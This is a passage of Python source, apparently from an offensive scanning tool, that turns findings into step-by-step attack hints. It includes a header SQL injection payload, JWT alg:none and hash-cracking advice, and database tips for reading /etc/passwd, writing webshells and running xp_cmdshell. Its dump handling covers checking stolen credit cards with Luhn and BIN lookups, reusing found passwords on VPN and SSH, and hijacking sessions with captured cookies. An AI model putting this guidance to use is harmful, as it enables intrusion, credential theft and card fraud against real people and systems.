        "This often bypasses WAFs that only inspect URL/POST params."
    ),
    "header": (
        "💉 Header injection (X-Forwarded-For, Referer, etc.)! "
        "The app's logging/analytics queries use header values. "
        "Inject via Burp: X-Forwarded-For: ' OR 1=1--"
    ),
}


# ═══════════════════════════════════════════════════════════════
#  HINT GENERATOR FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def get_cookie_hint(cookie_name: str, cookie_value: str = "") -> Optional[str]:
    """Get actionable hint for a cookie."""
    name_lower = cookie_name.lower().strip()
    
    # Direct lookup
    for key, info in COOKIE_VENDOR_DB.items():
        if key == name_lower or name_lower.startswith(key):
            tools_str = ", ".join(info["tools"]) if info.get("tools") else ""
            hint = f"💡 <b>{info['vendor']}</b> ({info['type']})\n"
            hint += f"   {info['hint']}"
            if tools_str:
                hint += f"\n   🧰 Tools: {tools_str}"
            return hint
    
    # Pattern-based fallback
    for pattern, info in COOKIE_PATTERN_DB:
        if re.match(pattern, cookie_name, re.IGNORECASE):
            hint = f"💡 <b>{info['vendor']}</b> ({info['type']})\n"
            hint += f"   {info['hint']}"
            return hint
    
    # Value-based detection
    if cookie_value:
        val = cookie_value.strip()
        if val.startswith("eyJ"):  # Base64 JSON → JWT
            return ("💡 <b>JWT Token</b> (Auth)\n"
                    "   This looks like a JWT (base64-encoded JSON). "
                    "Decode at jwt.io to see payload claims. "
                    "Try alg:none attack, or brute-force the signing key with jwt_tool.")
        if len(val) == 32 and re.match(r'^[a-fA-F0-9]+$', val):
            return ("💡 <b>Possible MD5 Hash</b>\n"
                    "   32-char hex value — likely a session hash or CSRF token. "
                    "Try rainbow table lookup at crackstation.net.")
        if len(val) == 64 and re.match(r'^[a-fA-F0-9]+$', val):
            return ("💡 <b>Possible SHA-256 Hash</b>\n"
                    "   64-char hex value — likely a strong session token or HMAC.")
    
    return None


def get_secret_hint(secret_type: str, secret_value: str = "", key_name: str = "") -> Optional[str]:
    """Get actionable hint for a discovered secret."""
    type_lower = secret_type.lower().strip().replace(" ", "_").replace("-", "_")
    
    # Direct lookup
    for key, info in SECRET_HINT_DB.items():
        if key == type_lower or key in type_lower or type_lower in key:
            hint = f"💡 Severity: <b>{info['severity']}</b>\n"
            hint += f"   {info['hint']}"
            if info.get("tools"):
                hint += f"\n   🧰 Tools: {', '.join(info['tools'])}"
            return hint
    
    # Value-based detection
    if secret_value:
        val = secret_value.strip()
        if "mysql://" in val or "mysql2:" in val:
            info = SECRET_HINT_DB["mysql_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "jdbc:" in val:
            info = SECRET_HINT_DB["jdbc_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "mongodb://" in val or "mongodb+srv://" in val:
            info = SECRET_HINT_DB["mongodb_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "redis://" in val:
            info = SECRET_HINT_DB["redis_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("sk_live_") or val.startswith("rk_live_"):
            info = SECRET_HINT_DB["stripe_secret"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("pk_live_"):
            info = SECRET_HINT_DB["stripe_publishable"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("AKIA"):
            info = SECRET_HINT_DB["aws_access_key"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("ghp_") or val.startswith("gho_") or val.startswith("github_pat_"):
            info = SECRET_HINT_DB["github_token"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("xoxb-") or val.startswith("xoxp-"):
            info = SECRET_HINT_DB["slack_token"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("SG."):
            info = SECRET_HINT_DB["sendgrid_api"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if val.startswith("sk-") and len(val) > 30:
            info = SECRET_HINT_DB["openai_api"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "-----BEGIN" in val and "PRIVATE KEY" in val:
            info = SECRET_HINT_DB["private_key"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
    
    # Keyword fallback from key_name
    if key_name:
        kn = key_name.lower()
        if "mysql" in kn or "mariadb" in kn:
            info = SECRET_HINT_DB["mysql_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "jdbc" in kn:
            info = SECRET_HINT_DB["jdbc_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "mongo" in kn:
            info = SECRET_HINT_DB["mongodb_connection"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "smtp" in kn:
            info = SECRET_HINT_DB["smtp_credentials"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "email" in kn and "pass" in kn:
            info = SECRET_HINT_DB["email_password"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "firebase" in kn:
            info = SECRET_HINT_DB["firebase_config"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
        if "telegram" in kn or "bot_token" in kn:
            info = SECRET_HINT_DB["telegram_bot_token"]
            return f"💡 Severity: <b>{info['severity']}</b>\n   {info['hint']}"
    
    return None


def get_endpoint_hint(endpoint_type: str) -> Optional[str]:
    """Get hint for an endpoint category."""
    return ENDPOINT_HINTS.get(endpoint_type)


def get_waf_hint(waf_name: str = "", cms_name: str = "") -> Optional[str]:
    """Get bypass hint for a WAF or CMS."""
    hints = []
    
    if waf_name:
        waf_lower = waf_name.lower()
        for key, hint in WAF_BYPASS_HINTS.items():
            if key in waf_lower or waf_lower in key:
                hints.append(hint)
                break
    
    if cms_name:
        cms_lower = cms_name.lower()
        for key, hint in CMS_HINTS.items():
            if key in cms_lower or cms_lower in key:
                hints.append(hint)
                break
    
    return "\n".join(hints) if hints else None


def get_port_hint(port: int) -> Optional[str]:
    """Get hint for an open port."""
    return PORT_HINTS.get(port)


def get_sqli_hint(injection_type: str, injection_point: str = "url") -> Optional[str]:
    """Get hint for an SQLi finding."""
    hints = []
    
    itype = injection_type.lower()
    if itype in SQLI_HINTS:
        hints.append(SQLI_HINTS[itype])
    
    ipoint = injection_point.lower()
    if ipoint in SQLI_HINTS and ipoint != itype:
        hints.append(SQLI_HINTS[ipoint])
    
    return "\n".join(hints) if hints else None


def get_dump_hint(tables_found: int, has_users: bool = False, 
                  has_cards: bool = False, dbms: str = "") -> str:
    """Get hint for data dump results."""
    hints = []
    
    if has_cards:
        hints.append("💳 CREDIT CARD DATA FOUND! Verify validity with Luhn check. "
                     "BIN lookup (first 6 digits) reveals issuing bank.")
    if has_users:
        hints.append("👤 User credentials found! Try password reuse — "
                     "test the same creds on: admin panels, email, cloud services, VPN, SSH.")
    
    if dbms.lower() in ("mysql", ""):
        hints.append("📖 MySQL tips: Check for FILE privilege (SELECT LOAD_FILE('/etc/passwd')), "
                    "INTO OUTFILE for webshell write, and @@secure_file_priv restrictions.")
    elif dbms.lower() == "mssql":
        hints.append("📖 MSSQL tips: Try xp_cmdshell for OS command execution, "
                    "sp_configure to enable it, or OPENROWSET for file read.")
    elif dbms.lower() == "postgresql":
        hints.append("📖 PostgreSQL tips: Try COPY ... TO '/path' for file write, "
                    "pg_read_file() for read, or CREATE LANGUAGE plpython3u for code exec.")
    
    if tables_found == 0:
        hints.append("⚠️ No tables found — the user may lack SELECT on information_schema. "
                    "Try DIOS (Dump In One Shot) or blind enumeration instead.")
    
    return "\n".join(hints) if hints else "No specific hints for this dump."


# ═══════════════════════════════════════════════════════════════
#  CONTEXT-AWARE JIRA HINTS (for the specific log the user showed)
# ═══════════════════════════════════════════════════════════════

def get_contextual_hints(url: str, cookies: Dict = None, secrets: list = None,
                         waf: Dict = None, endpoints: Dict = None) -> List[str]:
    """Generate high-level contextual hints based on the combination of findings."""
    hints = []
    
    url_lower = url.lower()
    
    # Jira/Atlassian context
    if "jira" in url_lower or "atlassian" in url_lower or "confluence" in url_lower:
        hints.append(
            "🏢 <b>Atlassian Stack Detected!</b> Combined attack surface:\n"
            "   1) JSESSIONID + atlassian.xsrf.token = Full authenticated API access\n"
            "   2) REST API: /rest/api/2/search?jql= for issue search\n"
            "   3) /rest/api/2/user/search?username= for user enum\n"
            "   4) If Jira Service Desk: /servicedesk/customer/portals\n"
            "   5) MySQL/JDBC connection strings → direct DB access"
        )
    
    # Database + connection string combo
    if secrets:
        has_db_conn = any("mysql" in str(s).lower() or "jdbc" in str(s).lower() 
                         or "mongo" in str(s).lower() or "redis" in str(s).lower() 
                         for s in secrets)
        has_creds = any("password" in str(s).lower() or "email" in str(s).lower() 
                       for s in secrets)
        
        if has_db_conn and has_creds:
            hints.append(
                "⚠️ <b>Database Connection + Credentials found!</b> "
                "Try: extract creds from connection string, connect directly to the database, "
                "and dump sensitive tables."
            )
    
    # Cookie + auth combo
    if cookies:
        cookie_names = {k.lower() for k in cookies.keys()}
        has_session = any(s in cookie_names for s in ["jsessionid", "phpsessid", "connect.sid", "session"])
        has_csrf = any(c for c in cookie_names if "csrf" in c or "xsrf" in c or "token" in c)
        
        if has_session and has_csrf:
            hints.append(
                "🔓 <b>Session + CSRF token pair found!</b> "
                "Import BOTH cookies into your browser/Burp to assume the authenticated session. "
                "The CSRF token is needed for POST/PUT/DELETE operations."
            )
    
    return hints
